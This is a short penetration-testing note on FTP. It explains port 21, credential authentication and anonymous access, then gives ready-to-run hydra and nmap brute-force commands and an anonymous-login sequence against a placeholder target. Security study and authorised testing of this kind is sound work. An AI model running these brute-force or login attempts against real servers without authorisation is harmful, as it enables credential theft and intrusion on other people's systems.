# FTP

# Explanation

- FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client.

- It is also frequently used as a means of transferring files to and from the directory of a web server.

- FTP authentication requires a username and password combination. As a result, we can perform a brute-force attack on the FTP server in order to identify legitimate credentials.

- In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access to the FTP server without providing any legitimate credentials.

# FTP brute force attack

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> -t 4 ftp
```

```
nmap --script ftp-brute --script-args userdb=/root/users.txt -p 21 <target>
```

# FTP anonymous login

```
ftp <target>
```

```
Name : anonymous
```

```
Password : ""
```
